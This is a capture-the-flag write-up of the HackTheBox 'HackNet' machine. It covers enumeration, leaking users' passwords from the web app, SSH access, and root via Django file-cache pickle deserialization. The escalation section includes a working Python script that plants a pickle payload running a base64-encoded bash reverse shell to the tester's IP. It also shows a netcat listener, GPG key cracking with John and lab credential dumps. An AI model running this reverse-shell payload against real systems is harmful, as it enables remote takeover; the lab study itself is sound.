- - - 
created : 13-09-2025 

Tags : #medium

Released on 13 Sep 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash                                                                                                 
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a hacknet.htb -- -A    


Open 10.10.11.85:22
Open 10.10.11.85:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-title: HackNet - social network for hackers
|_http-favicon: Unknown favicon MD5: B89198D9BEDA866B6ADC1D0CD9ECAEB6
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```
# Enumeration
## HTTP (80)

Register a user and you can perform the following operations:

- Modify personal information (change name, signature, and upload avatar)
- Leave a message to others/yourself
- Like others

![Pasted image 20250913213337.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250913213337.png)
### DirSearch

We can use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ dirsearch -u http://hacknet.htb

[21:33:47] Starting:                                                                                   
[21:34:07] 302 -    0B  - /comment  ->  /                                   
[21:34:08] 302 -    0B  - /contacts  ->  /                                  
[21:34:11] 200 -    3KB - /explore                                          
[21:34:12] 404 -  555B  - /favicon.ico                                      
[21:34:19] 200 -  857B  - /login                                            
[21:34:20] 302 -    0B  - /logout  ->  /                                    
[21:34:21] 301 -  169B  - /media  ->  http://hacknet.htb/media/             
[21:34:21] 404 -  555B  - /media.tar.gz
[21:34:21] 404 -  555B  - /media.tar                                        
[21:34:21] 404 -  555B  - /media.tar.bz2
[21:34:21] 404 -  555B  - /media_admin                                      
[21:34:21] 403 -  555B  - /media/
[21:34:21] 404 -  555B  - /media.zip                                        
[21:34:21] 404 -  555B  - /media/export-criteo.xml                          
[21:34:22] 302 -    0B  - /messages  ->  /                                  
[21:34:31] 302 -    0B  - /post  ->  /                                      
[21:34:31] 302 -    0B  - /profile  ->  /                                   
[21:34:33] 200 -  948B  - /register                                         
[21:34:34] 302 -    0B  - /search  ->  /                                    
[21:34:38] 404 -  555B  - /static/api/swagger.json                          
[21:34:38] 404 -  555B  - /static/dump.sql                                  
[21:34:38] 404 -  555B  - /static/api/swagger.yaml             
```
## FFuf

We can use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to enumerate subdomains:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -H 'Host: FUZZ.hacknet.htb' -u http://hacknet.htb -fs 169 -c 
```
# Exploit

We try uploading [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md): SANITIZED

![Pasted image 20250914000833.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250914000833.png)

Change username:

![Pasted image 20250918210926.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918210926.png)

You can see the users variables listed in `likes`: 

![Pasted image 20250918211102.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918211102.png)

Extracted:

```
zero_day:Zer0D@yH@ck
glitch:Gl1tchH@ckz
shadowmancer:Sh@d0wM@ncer
virus_viper:V!rusV!p3r2024
stealth_hawk:St3@lthH@wk
cryptoraven:CrYptoR@ven42
rootbreaker:R00tBr3@ker#
netninja:N3tN1nj@2024
shadowwalker:Sh@dowW@lk2024
shadowmancer:Sh@d0wM@ncer
phreaker:Phre@k3rH@ck
datadive:D@taD1v3r
codebreaker:C0d3Br3@k!
shadowcaster:Sh@d0wC@st!
mikey: HTB{{REDACTED_PASSWD}}
exploit_wizard:Expl01tW!zard
whitehat:Wh!t3H@t2024
trojanhorse:Tr0j@nH0rse!
packetpirate:P@ck3tP!rat3
brute_force:BrUt3F0rc3#
hexhunter:H3xHunt3r!
bytebandit:Byt3B@nd!t123
blackhat_wolf:Bl@ckW0lfH@ck
cyberghost:Gh0stH@cker2024
darkseeker:D@rkSeek3r#
deepdive:D33pD!v3r 
shadowmancer:Sh@d0wM@ncer
```

Entered as `shadowcaster` and grabbed private users creds:

![Pasted image 20250919210508.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250919210508.png)

```bash
<div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shawalker &lt;QuerySet [{&#x27;id&#x27;: 18, &#x27;email&#x27;: &#x27;mikey@hacknet.htb&#x27;, &#x27;username&#x27;: &#x27;backdoor_bandit&#x27;, &#x27;password&#x27;: &#x27; HTB{{REDACTED_PASSWD}} &#x27;, &#x27;picture&#x27;: &#x27;18.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.&#x27;, &#x27;contact_requests&#x27;: 1, &#x27;unread_messages&#x27;: 2, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: True}, {&#x27;id&#x27;: 25, &#x27;email&#x27;: &#x27;shadowwalker@hushmail.com&#x27;, &#x27;username&#x27;: &#x27;shadowwalker &#x27;, &#x27;password&#x27;: &#x27;Sh@dowW@lk2024&#x27;, &#x27;picture&#x27;: &#x27;25.jpg&#x27;, &#x27;about&#x27;: &#x27;A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False},
```

## SSH

We can enter [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) as `mikey`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hacknet]
└─$ ssh mikey@hacknet.htb     
mikey@hacknet.htbs password: 

mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt 
  HTB{{REDACTED_FLAG}}
```
# Lateral Movement - Privilege Escalation
## Mikey to Sandy

We can see in the web directory `sandy` own the backups files:

```bash
mikey@hacknet:/var/www/HackNet/backups$ ls -la
total 56
drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg
```

We can control the `django_cache` directory:

```bash
mikey@hacknet:/var/tmp$ ls -la
total 16
drwxrwxrwt  4 root  root     4096 Sep 21 07:50 .
drwxr-xr-x 12 root  root     4096 May 31  2024 ..
drwxrwxrwx  2 sandy www-data 4096 Feb 10  2025 django_cache
```

We can see the `views.py` file in `/var/www/HackNet/SocialNetwork`:

```python
@cache_page(60)  
def explore(request):  
    if not "email" in request.session.keys():  
        return redirect("index")  
  
    session_user = get_object_or_404(SocialUser, email=request.session['email'])  
  
    page_size = 10  
    keyword = ""  
  
    if "keyword" in request.GET.keys():  
        keyword = request.GET['keyword']  
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")  
    else:  
        posts = SocialArticle.objects.all().order_by("-date")  
  
    pages = ceil(len(posts) / page_size)  
  
    if "page" in request.GET.keys() and int(request.GET['page']) > 0:  
        post_start = int(request.GET['page'])*page_size-page_size  
        post_end = post_start + page_size  
        posts_slice = posts[post_start:post_end]  
    else:  
        posts_slice = posts[:page_size]  
  
    news = get_news()  
    request.session['requests'] = session_user.contact_requests  
    request.session['messages'] = session_user.unread_messages  
  
    for post_item in posts:  
        if session_user in post_item.likes.all():  
            post_item.is_like = True  
  
    posts_filtered = []  
    for post in posts_slice:  
        if not post.author.is_hidden or post.author == session_user:  
            posts_filtered.append(post)  
        for like in post.likes.all():  
            if like.is_hidden and like != session_user:  
                post.likes_number -= 1  
  
    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}  
  
    return render(request, "SocialNetwork/explore.html", context)
```

Django reads the contents of the cached file directly with loads without any filtering. 

This means that we can construct any malicious serialized content to control the content returned by Django, or even RCE, and as long as we know the name and location where the cache is stored, then we will be able to execute the code directly.

So the next thing to do is to generate a cache, generate a pickle serialized [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md), then write to the cache, and finally access to activate. 

Below is a simpler model of the [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) code, make sure to encode your shell parameters:

```python
import pickle
import base64
import os
import time

# ---- Setting the Reverse Shell ----

cache_dir = "/var/tmp/django_cache"
cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzMvMTMzNyAwPiYxKSAm | base64 -d | bash"

# ---- Generate Pickle payload ----

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,),)

payload = pickle.dumps(RCE())


# ---- Write Cache Files ----

for filename in os.listdir(cache_dir):
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path)  # Delete the original file  
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload) # Write Payload
        print(f"[+] Written payload to {filename}")		 
```

```bash
mikey@hacknet:/tmp$ nano ex.py
mikey@hacknet:/tmp$ chmod +x *.py

mikey@hacknet:/tmp/.privesc$ python3 ex.py 
[+] Written payload to 123456.djcache
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.73] from (UNKNOWN) [10.10.11.85] 44662
ls
backups
db.sqlite3
HackNet
manage.py
media
SocialNetwork
static
whoami
sandy
```

We can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) now.

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
sandy@hacknet:/var/www/HackNet$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                    
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
sandy@hacknet:/var/www/HackNet$ cd ~

```
##  Sandy to Root

We can find the `armored_key.asc` file and `gpg2john` it to crack it with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hacknet/sandy]
└─$ gpg2john armored_key.asc >> hash                               

File armored_key.asc

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hacknet/sandy]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:04 DONE (2025-09-21 15:32) 0.2105g/s 90.94p/s 90.94c/s 90.94C/s 246810..nicole1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can write a [Bash](../../../3%20-%20Tags/Hacking%20Concepts/Bash.md) script to decrypt the backups files:

```bash
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="sweetheart" 

# Importing a private key
gpg --import "$KEY_PATH"

# Decryption
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Decrypting $file → $outpath"
    if [ -n "$PASSPHRASE" ]; then
        gpg --batch --yes --passphrase "$PASSPHRASE" --pinentry-mode loopback -o "$outpath" -d "$file"
    else
        gpg --batch --yes -o "$outpath" -d "$file"
    fi
done

echo "[*] Done. Decrypted files are in $OUTPUT_DIR"
```

And use it:

```bash
sandy@hacknet:/var/www/HackNet/backups$ bash script.sh 
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
[*] Decrypting /var/www/HackNet/backups/backup01.sql.gpg → /tmp/backup01.sql.sql
gpg: keybox '/home/sandy/.gnupg/pubring.kbx' created
gpg: encrypted with RSA key, ID FC53AFB0D6355F16
gpg: decryption failed: No secret key
[*] Decrypting /var/www/HackNet/backups/backup02.sql.gpg → /tmp/backup02.sql.sql
gpg: encrypted with RSA key, ID FC53AFB0D6355F16
gpg: decryption failed: No secret key
[*] Decrypting /var/www/HackNet/backups/backup03.sql.gpg → /tmp/backup03.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
[*] Done. Decrypted files are in /tmp
```

Now we search with `grep` for passwords:

```bash
sandy@hacknet:/var/www/HackNet/backups$ cd /tmp
sandy@hacknet:/tmp$ cat backup0* | grep password
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
```

Now we can `su root` and `cat` the root flag:

```bash
sandy@hacknet:/var/www/HackNet/backups$ su root
Password: 
root@hacknet:/var/www/HackNet/backups# cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Another one Pwned !!